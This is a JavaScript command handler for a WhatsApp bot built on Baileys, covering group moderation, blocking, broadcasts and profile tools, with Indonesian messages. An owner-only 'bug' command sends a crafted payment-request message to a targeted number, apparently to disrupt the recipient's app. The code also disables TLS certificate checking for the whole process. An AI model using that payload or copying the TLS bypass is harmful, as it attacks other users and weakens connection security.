require('./index')
const { BufferJSON, 
WA_DEFAULT_EPHEMERAL, 
generateWAMessageFromContent, 
proto, generateWAMessageContent, 
generateWAMessage, 
prepareWAMessageMedia, 
areJidsSameUser, 
MessageType,
MessageOptions, 
Mimetype,
getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const cheerio = require('cheerio')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { smsg, formatp, tanggal, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom } = require('./lib/myfunc')

// read databaseebhy

global.db = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db) global.db.data = {
sticker: {},
database: {},
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}

process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
module.exports = conn = async (conn, m, chatUpdate/*, store*/) => {
try {
var cmd = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var prefix = /^[!?#/.,]/.test(cmd) ? cmd.match(/^[!?#/.,]/gi) : "/"
var body = (m.mtype === 'conversation' && m.message.conversation.startsWith(prefix)) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption.startsWith(prefix) ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption.startsWith(prefix) ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text.startsWith(prefix) ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
var budy = (typeof m.text == 'string' ? m.text : '')
/*var prefix = prefa ? /^[!?#$/.,]/gi.test(body) ? body.match(/^[!?#$/.,]/gi)[0] : "" : prefa ?? global.prefix*/
const isCmd = body.startsWith(prefix)
const codod = body.replace(prefix, '').trim().split(/ +/).shift()
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const botNumber = await conn.decodeJid(conn.user.id)
const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const itsMe = m.sender == botNumber ? true : false
text = q = args.join(" ").replace(/kontol|kontl|kntl|kotol|jmbt|jembut|memek|mmk|memk|mmek|bewok|bokep|bkep|anjing|ajeg|bagst|bangst|babi|bangsat|tolol|jancok|jnck|jancog|jancg|cok|asu|ngentot|ngent|ngntt|bajingan|bajing|hentai|bokep|blowjob|menstruasi|bugil|gay|xxx|xnxx|sodom|kondom|tetek|asw|ngewe|pelacur|pelcr|goblok|gblk|kanjut|anjg|idiot|bego|dick|pussy|telanjang|pusy|pixhentai|pornhub|porn|porno|pornografi|telanjangg|mendesah|montok|simontok/g, '×××')
tetot = args.join("").replace(/kontol|kontl|kntl|kotol|jmbt|jembut|memek|mmk|memk|mmek|bewok|bokep|bkep|anjing|ajeg|bagst|bangst|babi|bangsat|tolol|jancok|jnck|jancog|jancg|cok|asu|ngentot|ngent|ngntt|bajingan|bajing|hentai|bokep|blowjob|menstruasi|bugil|gay|xxx|xnxx|sodom|kondom|tetek|asw|ngewe|pelacur|pelcr|goblok|gblk|kanjut|anjg|idiot|bego|dick|pussy|telanjang|pusy|pixhentai|pornhub|porn|porno|pornografi|telanjangg|mendesah|montok|simontok/g, '×××')
if(m.text.includes(` ${codod} `)) {
text = m.text.replace(prefix, "").trim().split` `.filter((v) => v).join(" ").replace(/kontol|kontl|kntl|kotol|jmbt|jembut|memek|mmk|memk|mmek|bewok|bokep|bkep|anjing|ajeg|bagst|bangst|babi|bangsat|tolol|jancok|jnck|jancog|jancg|cok|asu|ngentot|ngent|ngntt|bajingan|bajing|hentai|bokep|blowjob|menstruasi|bugil|gay|xxx|xnxx|sodom|kondom|tetek|asw|ngewe|pelacur|pelcr|goblok|gblk|kanjut|anjg|idiot|bego|dick|pussy|telanjang|pusy|pixhentai|pornhub|porn|porno|pornografi|telanjangg|mendesah|montok|simontok/g, '×××')
} else if(budy.slice(1).includes(` ${codod}`)) {
text = ""
} else {
text = q = args.join(" ").replace(/kontol|kontl|kntl|kotol|jmbt|jembut|memek|mmk|memk|mmek|bewok|bokep|bkep|anjing|ajeg|bagst|bangst|babi|bangsat|tolol|jancok|jnck|jancog|jancg|cok|asu|ngentot|ngent|ngntt|bajingan|bajing|hentai|bokep|blowjob|menstruasi|bugil|gay|xxx|xnxx|sodom|kondom|tetek|asw|ngewe|pelacur|pelcr|goblok|gblk|kanjut|anjg|idiot|bego|dick|pussy|telanjang|pusy|pixhentai|pornhub|porn|porno|pornografi|telanjangg|mendesah|montok|simontok/g, '×××')
}
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const isMedia = /image|video|sticker|audio/.test(mime)
const smime = (m.msg).mimetype || ''
const sisMedia = /image|video|sticker|audio/.test(smime)

// Group
const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false


try {

} catch (err) {
console.log(err)
}

// Public & Self
if (!conn.public) {
if (!m.key.fromMe) return
}

// Push Message To Console && Auto Read
if (m.message) {
/*conn.sendReadReceipt(m.chat, m.sender, [m.key.id])*/
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
//Antidelte

// write database every 1 minute
/*setInterval(() => {
fs.writeFileSync('./src/database.json', JSON.stringify(global.db, null, 2))
}, 60 * 1000)*/

// reset limit every 12 hours
let cron = require('node-cron')
cron.schedule('00 12 * * *', () => {
let user = Object.keys(global.db.data.users)
let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
for (let jid of user) global.db.data.users[jid].limit = limitUser
console.log('Reseted Limit')
}, {
scheduled: true,
timezone: "Asia/Jakarta"
})


/*if(!m.isGroup) {
if(!isCreator && !m.sender.startsWith("62") && !m.sender.startsWith("60")) {
if (new Date() * 1 - kickadd.time > 20000) {
kickadd.time = new Date() * 1
fs.writeFileSync('./kick.json', JSON.stringify(kickadd))
await conn.updateBlockStatus(quoted.sender, 'block')
return kickadd.time = new Date() * 1
} else {
await sleep(20000 - new Date() * 1 - kickadd.time)
await conn.updateBlockStatus(quoted.sender, 'block')
return kickadd.time = new Date() * 1
}
}*/

//Anti spam
/*this.spam = this.spam ? this.spam : {}
if(command) {
if (quoted.sender in this.spam) {
this.spam[quoted.sender].count++
if (m.messageTimestamp * 1 - this.spam[quoted.sender].lastspam > 10) {
if (this.spam[quoted.sender].count > 2) {
//db.data.users[m.sender].banned = true
this.spam[m.sender] = {
jid: m.sender,
count: 0,
lastspam: 0
}
let ytu = await conn.sendMessage(m.chat, {contacts: {displayName: '1',contacts:[{
"displayName": "Perwira Kusuma (Owner)",
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;Perwira Kusuma (Owner);;;\nFN:Perwira Kusuma (Owner)\nitem1.TEL;waid=6282230819722:+62 822-3081-9722\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:Kamu melakukan spam hubungi owner untuk di unblock\nX-WA-BIZ-NAME:Perwira Kusuma (Owner)\nEND:VCARD",
"contextInfo": {
externalAdReply:{title: 'Per144 (Subscribe Now)', body: 'Support me on YouTube - Click here',mediaUrl: 'https://youtube.com/channel/UCiA1c3DgEqjfCm5t6UwQ37w', sourceUrl: 'https://youtube.com/channel/UCiA1c3DgEqjfCm5t6UwQ37w', mediaType: 0, renderLargerThumbnail: true, showAdAttribution: true}
}
}]
}
})
await conn.sendMessage(quoted.sender, { text: `*Sistem otomatis block!*\n\nAnda melakukan spam hubungi owner untuk di unblock`}, { quoted : ytu })

await sleep(3000)
conn.sendMessage(quoted.sender, {text: 'Kamu melakukan pelanggaran yaitu spam bot, chat owner untuk diunblock.\n\nAnda akan diblokir dalam waktu 5 detik lagi'}, {quoted: ytu})
await sleep(5000)
await conn.updateBlockStatus(quoted.sender, "block")
try {
ppuser = await conn.profilePictureUrl(quoted.sender, 'image')
} catch {
ppuser = './image/nothing.jpg'
}
conn.sendButGamc("6282230819722@s.whatsapp.net", [{ buttonId: `unblock23 ${quoted.sender.split('@')[0]}`, buttonText: { displayText: 'Unblock' },type: 1}], `*Spam Block User*\nhttps://wa.me/${quoted.sender.split("@")[0]}`, '©P-Bot 2022\nThis is simple Bot WhatsApp', ppuser)
}
this.spam[quoted.sender].count = 0
this.spam[quoted.sender].lastspam = m.messageTimestamp * 1
}
}
else
this.spam[m.sender] = {
jid: m.sender,
count: 0,
lastspam: 0
}
}
}*/

pensi = `                   𝗕𝗼𝘁 𝗦𝘁𝗼𝗽𝗽𝗲𝗱

Bot sudah nonaktif untuk public
Tetap ingin bisa menggunakan bot ini?
Join grup untuk menggunakan 🖐️

List Online Bot

[1] Alita Bot
url:https://wa.me/6281617725071

[2] Arg Bot
url:https://wa.me/436502777799991

[3] Dita Bot (copy)
url:https://wa.me/6283846780373

[4] F Bot
url:https://wa.me/6282236054348

More info? Join Owner Group`

if(!m.isGroup) {
if (!isCreator) {
/*(async () => {templateButtones = [ {index: 1, urlButton: {displayText: 'WhatsApp Group', url: 'https://chat.whatsapp.com/IeiqIJ8wYxiFJp4lVOyXQG'}}]; templateMessages = {viewOnceMessage :{message : { templateMessage : {hydratedTemplate: { hydratedContentText:  pensi, hydratedFooterText: "©P-Bot 2022 Android\nThis is Simple Bot WhatsApp", hydratedButtons: templateButtones}}}}}; conn.relayMessage(m.chat, templateMessages, {})})()
await sleep(5000)
await m.reply("Byyy... 👋")
return conn.updateBlockStatus(quoted.sender, "block")*/
return
}
}

switch(command) {

case 'sewa':{
respons = `*Sewa Bot*

Sewa bot join grup selamanya bot aktif
Cuman 5k pembayaran via Pulsa/Dana
Chat owner untuk melanjutkan

©Perwira Bot WhatsApp`
conn.sendMessage(m.chat, {text: respons, contextInfo: {externalAdReply: {title: 'Owner Bot', body: 'Klik disini untuk menuju nomor Owner', sourceUrl: `https://wa.me/6281232646925`, mediaUrl: `https://wa.me/6281232646925`, mediaType: 1, renderLargerThumbnail: true, thumbnail: fs.readFileSync(`./image/pem.jpg`)}}})
}
break


case 'image': {
listy = `*List yang tersedia :*\n1. Anime\n2. Portrait\n3. Landscape\n4. Building`
if(text.length < 1) return m.reply(`*Masukkan pilihan menggunakan angka*\n*Contoh:* ${prefix}image 1\n\n${listy}`)
imn = ""
if(text.includes("1")) {
imn = "anime"
} else if(text.includes("2")) { 
imn = "portrait"
} else if(text.includes("3")) { 
imn = "landscape"
} else if(text.includes("4")) { 
imn = "building"
} else {
return m.reply("Harap masukkan pilihan yang tersedia")
}
try {
let { random_art } = require('@phaticusthiccy/open-apis')
yukl = await random_art(24, imn)
_yukl = yukl[Math.floor(Math.random() * yukl.length)]

conn.sendMessage(m.chat, {image: {url: _yukl.url}, caption: `Random image ${imn}`}, {quoted: m})
} catch(err) {
m.reply(String(err))
}
}
break




case 'chat': {
if (!isCreator) return m.reply(mess.owner)
if (!q) return m.reply('*Option :*\n1. archive\n2. unarchive\n3. read\n4. unread\n5. delete')
if (args[0] === 'archive') {
conn.chatModify({archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
conn.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
conn.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
conn.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break



case 'join': {
if (!isCreator) return m.reply(mess.owner)
if (new Date() * 1 - kickadd.time > 20000) {
kickadd.time = new Date() * 1
fs.writeFileSync('./kick.json', JSON.stringify(kickadd))
if(text.length < 1) return m.reply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Link Invalid!')
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await conn.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break



case 'leave': {
if (!isCreator) return m.reply(mess.owner)
if (new Date() * 1 - kickadd.time > 20000) {
kickadd.time = new Date() * 1
await fs.writeFileSync('./kick.json', JSON.stringify(kickadd))
await conn.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break



case 'setexif': {
if (!isCreator) return m.reply(mess.owner)
if(text.length < 1) return m.reply(`Contoh : ${prefix + command} packname|author`)
global.packname = text.split("|")[0]
global.author = text.split("|")[1]
m.reply(`Exif berhasil diubah menjadi\n\nPackname : ${global.packname}\nAuthor : ${global.author}`)
}
break




case 'kick': {
if (!m.isGroup) return m.reply(mess.group)
/*if (!isCreator) return m.reply("_Only for Owner_")*/
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (new Date() * 1 - kickadd.time > 20000) {
kickadd.time = new Date() * 1
fs.writeFileSync('./kick.json', JSON.stringify(kickadd))
if (text) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else if(quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply(`Tag nomor atau reply pesan\nContoh: ${prefix}${command} @orangnya`) 
}
} else {
m.reply("Tunggu beberapa detik lagi")
}
}
break



case 'add': {
if (!m.isGroup) return m.reply(mess.group)
/*if (!isCreator) return m.reply("_Only for Owner_")*/
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (new Date() * 1 - kickadd.time > 20000) {
kickadd.time = new Date() * 1
fs.writeFileSync('./kick.json', JSON.stringify(kickadd))
if (text) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else if(quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply(`Tag nomor atau reply pesan\nContoh: ${prefix}${command} @orangnya`) 
}
} else {
m.reply("Tunggu beberapa detik lagi")
}
}
break



case 'promote': {
if (!m.isGroup) return m.reply(mess.group)
/*if (!isCreator) return m.reply("_Only for Owner_")*/
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (text) { 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else if(quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply(`Tag nomor atau reply pesan\nContoh: ${prefix}${command} @orangnya`)
}
}
break



case 'demote': {
if (!m.isGroup) return m.reply(mess.group)
/*if (!isCreator) return m.reply("_Only for Owner_")*/
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (text) { 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else if(quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Done')).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply(`Tag nomor atau reply pesan\nContoh: ${prefix}${command} @orangnya`)
}
}
break



case 'block': {
if (!isCreator) return m.reply(mess.owner)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break



case 'unblock23': {
if (!isCreator) return m.reply(mess.owner)
await conn.updateBlockStatus(`${text}@s.whatsapp.net`, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break



case 'unblock': {
if (!isCreator) return m.reply(mess.owner)
if(quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if(text) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else {
m.reply("Reply pesan atau masukkan nomor")
}
}
break



case 'setname': case 'setsubject': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if(text.length < 1) return m.reply('Text ?')
await conn.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break



case 'setnam': case 'setsub': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if(text.length < 1) return m.reply('Text ?')
await conn.groupUpdateSubject(`${text}`, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break



case 'setdesc': case 'setdesk': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if(text.length < 1) return m.reply('Text ?')
await conn.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
}
break



case 'setppbot': {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
await conn.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break




case 'setpp': {

if(!isCreator) return m.reply("Khusus Owner")
if(m.isGroup) return m.reply("Hanya bisa di private chat")
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)

let media = await conn.downloadAndSaveMediaMessage(quoted)
var { img} = await require('./lib/myfunc'). generateProfilePicture(media)
conn.query({
tag: 'iq',
attrs: {
to: 
quoted.sender,
type: 'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
});
} break



case 'setppgrouup': case 'setppgrup': case 'setppgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins) return m.reply(mess.admin)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
await conn.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply(mess.success)
}
break



case 'tagall': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
let teks = `*Pesan :* ${q ? q : 'Tidak ada'}\n\n`
for (let mem of participants) {
teks += `@${mem.id.split('@')[0]} \n`
}
conn.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break



case 'hidetag': {
if (!m.isGroup) return m.reply(mess.group)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
textag = args.join(" ")
conn.sendMessage(m.chat, { text : textag ? textag : 'undefined' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break



case 'style': case 'styletext': {
/*if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
db.users[m.sender].limit -= 1 // -1 limit*/
let { styletext } = require('./lib/scraper')
if(text.length < 1) return m.reply(`*Masukkan text*\n*Contoh :* ${prefix+command} Textnya`)
let anu = await styletext(text)
let teks = `Style Text From ${text}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n`
}
m.reply(teks)
}
break


case 'group': case 'grup': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (args[0] === 'close'){
await conn.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await conn.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Mode Group`, conn.user.name, m)

}
}
break



case 'editinfo': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (args[0] === 'open'){
await conn.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'close'){
await conn.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
]
await conn.sendButtonText(m.chat, buttons, `Mode Edit Info`, conn.user.name, m)

}
}
break

case 'linkgroup': case 'linkgc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let response = await conn.groupInviteCode(m.chat)
conn.sendText(m.chat, `*Link to Join*\nhttps://chat.whatsapp.com/${response}\n\nLink Group\n*${groupMetadata.subject.replace(/[\n]/g, ' ')}*`, m, { detectLink: true })
}
break



case 'ephemeral': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if(text.length < 1) return m.reply('Masukkan value enable/disable')
if (args[0] === 'enable') {
await conn.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'disable') {
await conn.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break



case 'delete': case 'del': {
if (!isAdmins) return m.reply(mess.admin)
if (!m.quoted) return m.reply('false')
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) return m.reply('Pesan tersebut bukan dikirim oleh bot!')
conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break



case 'bug': {
if (!isCreator) return m.reply(mess.owner)
let ioi = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
(async () => {
var fur = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"text": "en990"
}
}),{quoted : null})
conn.relayMessage(ioi, fur.message, {messageId: fur.key.id})
}
)()
}
break



case 'bcgc': case 'bcgroup': {
if (!isCreator) return m.reply(mess.owner)
if(text.length < 1) return m.reply(`Text mana?\n\nContoh : ${prefix + command} fatih-san`)
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 3} detik`)
for (let i of anu) {
await sleep(3000)
let btn = [{
callButton: {
displayText: 'Phone',
phoneNumber: '+62 8123-3264-6925'
}
}, {
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/perwira_kusuma1'
}
}, {
quickReplyButton: {
displayText: 'Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Menu',
id: 'menu'
}
}]
let txt = `Broadcast by Owner\n\n${text}`
conn.sendButImg(i, txt, '©Perwira Bot WhatsApp', fs.readFileSync('./image/pem.jpg'), btn)
}
m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break



case 'bc':{
if (!isCreator) return m.reply(mess.owner)
m.reply(`${coomd.length * 3} detik`)
for (let i of coomd) {
await sleep(3000)
let btn = [{
callButton: {
displayText: 'Phone',
phoneNumber: '+62 8123-3264-6925'
}
}, {
urlButton: {
displayText: 'Instagram',
url: 'https://instagram.com/perwira_kusuma1'
}
}, {
quickReplyButton: {
displayText: 'Owner',
id: 'owner'
}
}, {
quickReplyButton: {
displayText: 'Menu',
id: 'menu'
}
}]
let txt = `Broadcast Owner Bot\n\n${text}\n`
conn.sendButImg(i, txt, '©Perwira Bot WhatsApp', fs.readFileSync('./image/pem.jpg'), btn)
}
m.reply('succes')
}
break


case 'totag': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins) return m.reply(mess.admin)
if (quoted.mtype == 'conversation') {
conn.sendMessage(m.chat, { text : quoted.text , mentions: participants.map(a => a.id), contextInfo: { forwardingScore: 5, isForwarded: true } }, { quoted: m })
} else {
let _msg = JSON.parse(JSON.stringify(quoted.fakeObj.message))
if (typeof _msg[quoted.mtype].contextInfo !== 'object') _msg[quoted.mtype].contextInfo = {}
if (typeof _msg[quoted.mtype].contextInfo.mentionedJid !== 'array') _msg[quoted.mtype].contextInfo.mentionedJid = participants.map(a => a.id)
let _pesan = quoted.fakeObj
_pesan.message = _msg
conn.copyNForward(m.chat, _pesan, true)
}
}
break

